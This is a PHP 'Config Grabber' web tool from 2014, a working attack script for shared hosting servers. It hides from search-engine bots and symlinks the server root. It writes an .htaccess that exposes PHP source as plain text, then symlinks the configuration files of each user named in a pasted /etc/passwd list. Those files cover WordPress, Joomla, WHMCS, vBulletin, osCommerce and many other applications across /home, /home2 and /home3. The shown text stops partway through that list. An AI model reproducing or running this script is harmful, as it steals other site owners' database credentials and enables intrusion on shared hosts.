<?php
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* Config Grabber v1.0
* --------------------
* Coded by Mister Spy
*---------------------
* Made In Tunsie � 2014
*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

@error_reporting(1);
@set_time_limit(0);

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bot = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $bot) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

echo '<!DOCTYPE html>
<head>
<title>Config Grabber By Mister Spy</title>
<link rel="shortcut icon" href="http://s2.postimg.org/5ekw7a5jd/image.png"/>
<style type="text/css">
body {
	background-color: #000000;
 font-family: Tahoma;
 font-size: x-large;
 font-weight: bold;
 color: #59E817;
  text-align: center;
}
</style>
<head>
<body>';
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Skid this wont work on Windows")</script>';exit;
}
else
{
if($_POST["m"] && !$_POST["passwd"]==""){
echo "Plz wait...<br/>";
$check=@ini_get("disable_functions");
if(eregi("symlink",$check)){
die("<font color=red>Symlink is Disabled</font>");
}
@mkdir("mrspy", 0777);
@chdir("mrspy");
@symlink("/","root");
$htaccess="
Options all
Options +Indexes
Options +FollowSymLinks
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None 
Satisfy Any
";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];

@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-shop.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-shop-os.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-oscom.txt');
@symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$user.'-oscommerce.txt');
@symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$user.'-oscommerces.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-shop2.txt');
@symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$user.'-shop-shopping.txt');
@symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$user.'-sale.txt');
@symlink('/home/'.$user.'/public_html/amember/config.inc.php',$user.'-amember.txt');
@symlink('/home/'.$user.'/public_html/config.inc.php',$user.'-amember2.txt');
@symlink('/home/'.$user.'/public_html/members/configuration.php',$user.'-members.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-4images1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-forum.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-forums.txt');
@symlink('/home/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
@symlink('/home/'.$user.'/public_html/protal/wp-config.php',$user.'-wp-protal.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-wp-test.txt');
@symlink('/home/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home/'.$user.'/public_html/protal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$user.'-vb3-config.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-vb1-config.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-includes-vb.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/class_core.php',$user.'-vbluttin-class_core.php.txt');
@symlink('/home/'.$user.'/public_html/vb/includes/class_core.php',$user.'-vbluttin-class_core.php1.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/class_core.php',$user.'-vbluttin-class_core.php2.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-zencart.txt'); 
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-shop-zencart.txt'); 
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-shop-ZCshop.txt'); 
@symlink('/home/'.$user.'/public_html/Settings.php',$user.'-smf.txt'); 
@symlink('/home/'.$user.'/public_html/smf/Settings.php',$user.'-smf2.txt'); 
@symlink('/home/'.$user.'/public_html/forum/Settings.php',$user.'-smf-forum.txt'); 
@symlink('/home/'.$user.'/public_html/forums/Settings.php',$user.'-smf-forums.txt'); 
@symlink('/home/'.$user.'/public_html/upload/includes/config.php',$user.'-up.txt');
@symlink('/home/'.$user.'/public_html/article/config.php',$user.'-Nwahy.txt'); 
@symlink('/home/'.$user.'/public_html/up/includes/config.php',$user.'-up2.txt');
@symlink('/home/'.$user.'/public_html/conf_global.php',$user.'-6.txt');
@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-7.txt');
@symlink('/home/'.$user.'/public_html/connect.php',$user.'-PHP-Fusion.txt');
@symlink('/home/'.$user.'/public_html/mk_conf.php',$user.'-9.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-traidnt1.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-4images.txt');
@symlink('/home/'.$user.'/public_html/sites/default/settings.php',$user.'-Drupal.txt');
@symlink('/home/'.$user.'/public_html/member/configuration.php',$user.'-1member.txt') ; 
@symlink('/home/'.$user.'/public_html/supports/includes/iso4217.php',$user.'-hostbills-supports.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-hostbills-client.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-hostbills-support.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-hostbills-billing.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-hostbills-billings.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-hostbills-host.txt');
@symlink('/home/'.$user.'/public_html/hosts/includes/iso4217.php',$user.'-hostbills-hosts.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-hostbills-hosting.txt');
@symlink('/home/'.$user.'/public_html/hostings/includes/iso4217.php',$user.'-hostbills-hostings.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-hostbills-hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbill/includes/iso4217.php',$user.'-hostbills-hostbill.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-cart-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-hosting-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-buy-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-checkout-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-host-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/shop/configuration.php',$user.'-shop-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/shopping/configuration.php',$user.'-shopping-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sale/configuration.php',$user.'-sale-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-client-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-clientsupport-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmc-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supp/configuration.php',$user.'-supp-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-sucure-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-sucure-whm-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-sucure-whmcs-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-panel-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosts/configuration.php',$user.'-hosts-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-submitticket-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-clients-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-clientes-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-client-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-billing-WHMCS.txt'); 
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-whm-manage-WHMCS.txt'); 
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-whm-my-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/myshop/configuration.php',$user.'-whm-myshop-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-billings-WHMCS.txt') ; 
@symlink('/home/'.$user.'/public_html/supports/configuration.php',$user.'-supports-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/auto/configuration.php',$user.'-auto-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/go/configuration.php',$user.'-go-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/'.$user.'/configuration.php',$user.'-USERNAME-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-bill-WHMCS.txt'); 
@symlink('/home/'.$user.'/public_html/payment/configuration.php',$user.'-payment-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/pay/configuration.php',$user.'-pay-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-purchase-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-clientarea-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/autobuy/configuration.php',$user.'-autobuy-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-shop.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-shop-os.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-oscom.txt');
@symlink('/home2/'.$user.'/public_html/oscommerce/includes/configure.php',$user.'-oscommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscommerces/includes/configure.php',$user.'-oscommerces.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-shop2.txt');
@symlink('/home2/'.$user.'/public_html/shopping/includes/configure.php',$user.'-shop-shopping.txt');
@symlink('/home2/'.$user.'/public_html/sale/includes/configure.php',$user.'-sale.txt');
@symlink('/home2/'.$user.'/public_html/amember/config.inc.php',$user.'-amember.txt');
@symlink('/home2/'.$user.'/public_html/config.inc.php',$user.'-amember2.txt');
@symlink('/home2/'.$user.'/public_html/members/configuration.php',$user.'-members.txt');
@symlink('/home2/'.$user.'/public_html/config.php',$user.'-4images1.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-forum.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-forums.txt');
@symlink('/home2/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
@symlink('/home2/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home2/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home2/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home2/'.$user.'/public_html/home2/wp-config.php',$user.'-wp-home2.txt');
@symlink('/home2/'.$user.'/public_html/protal/wp-config.php',$user.'-wp-protal.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home2/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-wp-test.txt');
@symlink('/home2/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home2/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home2/'.$user.'/public_html/protal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home2/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home2/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home2/'.$user.'/public_html/home2/configuration.php',$user.'-joomla-home2.txt');
@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home2/'.$user.'/public_html/vb3/includes/config.php',$user.'-vb3-config.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-vb1-config.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-includes-vb.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/class_core.php',$user.'-vbluttin-class_core.php.txt');
@symlink('/home2/'.$user.'/public_html/vb/includes/class_core.php',$user.'-vbluttin-class_core.php1.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/class_core.php',$user.'-vbluttin-class_core.php2.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-zencart.txt'); 
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-shop-zencart.txt'); 
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-shop-ZCshop.txt'); 
@symlink('/home2/'.$user.'/public_html/Settings.php',$user.'-smf.txt'); 
@symlink('/home2/'.$user.'/public_html/smf/Settings.php',$user.'-smf2.txt'); 
@symlink('/home2/'.$user.'/public_html/forum/Settings.php',$user.'-smf-forum.txt'); 
@symlink('/home2/'.$user.'/public_html/forums/Settings.php',$user.'-smf-forums.txt'); 
@symlink('/home2/'.$user.'/public_html/upload/includes/config.php',$user.'-up.txt');
@symlink('/home2/'.$user.'/public_html/article/config.php',$user.'-Nwahy.txt'); 
@symlink('/home2/'.$user.'/public_html/up/includes/config.php',$user.'-up2.txt');
@symlink('/home2/'.$user.'/public_html/conf_global.php',$user.'-6.txt');
@symlink('/home2/'.$user.'/public_html/include/db.php',$user.'-7.txt');
@symlink('/home2/'.$user.'/public_html/connect.php',$user.'-PHP-Fusion.txt');
@symlink('/home2/'.$user.'/public_html/mk_conf.php',$user.'-9.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-traidnt1.txt');
@symlink('/home2/'.$user.'/public_html/config.php',$user.'-4images.txt');
@symlink('/home2/'.$user.'/public_html/sites/default/settings.php',$user.'-Drupal.txt');
@symlink('/home2/'.$user.'/public_html/member/configuration.php',$user.'-1member.txt') ; 
@symlink('/home2/'.$user.'/public_html/supports/includes/iso4217.php',$user.'-hostbills-supports.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-hostbills-client.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-hostbills-support.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-hostbills-billing.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-hostbills-billings.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-hostbills-host.txt');
@symlink('/home2/'.$user.'/public_html/hosts/includes/iso4217.php',$user.'-hostbills-hosts.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-hostbills-hosting.txt');
@symlink('/home2/'.$user.'/public_html/hostings/includes/iso4217.php',$user.'-hostbills-hostings.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-hostbills-hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbill/includes/iso4217.php',$user.'-hostbills-hostbill.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-cart-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-hosting-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-buy-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-checkout-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-host-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/shop/configuration.php',$user.'-shop-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/shopping/configuration.php',$user.'-shopping-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sale/configuration.php',$user.'-sale-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-client-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-support-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-clientsupport-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home2/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmc-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supp/configuration.php',$user.'-supp-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-sucure-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-sucure-whm-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-sucure-whmcs-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-panel-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosts/configuration.php',$user.'-hosts-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-submitticket-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-clients-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-clientes-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-client-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-billing-WHMCS.txt'); 
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-whm-manage-WHMCS.txt'); 
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-whm-my-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/myshop/configuration.php',$user.'-whm-myshop-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-billings-WHMCS.txt') ; 
@symlink('/home2/'.$user.'/public_html/supports/configuration.php',$user.'-supports-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/auto/configuration.php',$user.'-auto-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/go/configuration.php',$user.'-go-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/'.$user.'/configuration.php',$user.'-USERNAME-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-bill-WHMCS.txt'); 
@symlink('/home2/'.$user.'/public_html/payment/configuration.php',$user.'-payment-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/pay/configuration.php',$user.'-pay-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-purchase-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-clientarea-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/autobuy/configuration.php',$user.'-autobuy-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-shop.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-shop-os.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-oscom.txt');
@symlink('/home3/'.$user.'/public_html/oscommerce/includes/configure.php',$user.'-oscommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscommerces/includes/configure.php',$user.'-oscommerces.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-shop2.txt');
@symlink('/home3/'.$user.'/public_html/shopping/includes/configure.php',$user.'-shop-shopping.txt');
@symlink('/home3/'.$user.'/public_html/sale/includes/configure.php',$user.'-sale.txt');
@symlink('/home3/'.$user.'/public_html/amember/config.inc.php',$user.'-amember.txt');
@symlink('/home3/'.$user.'/public_html/config.inc.php',$user.'-amember2.txt');
@symlink('/home3/'.$user.'/public_html/members/configuration.php',$user.'-members.txt');
@symlink('/home3/'.$user.'/public_html/config.php',$user.'-4images1.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-forum.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-forums.txt');
@symlink('/home3/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
@symlink('/home3/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home3/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home3/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home3/'.$user.'/public_html/home3/wp-config.php',$user.'-wp-home3.txt');
@symlink('/home3/'.$user.'/public_html/protal/wp-config.php',$user.'-wp-protal.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home3/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-wp-test.txt');
@symlink('/home3/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home3/'.$user.'/public_html/arcade/functions/dbclass.php',$user.'-ibproarcade.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home3/'.$user.'/public_html/protal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home3/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home3/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home3/'.$user.'/public_html/home3/configuration.php',$user.'-joomla-home3.txt');
@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home3/'.$user.'/public_html/vb3/includes/config.php',$user.'-vb3-config.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-vb1-config.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-includes-vb.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/class_core.php',$user.'-vbluttin-class_core.php.txt');
@symlink('/home3/'.$user.'/public_html/vb/includes/class_core.php',$user.'-vbluttin-class_core.php1.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/class_core.php',$user.'-vbluttin-class_core.php2.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-zencart.txt'); 
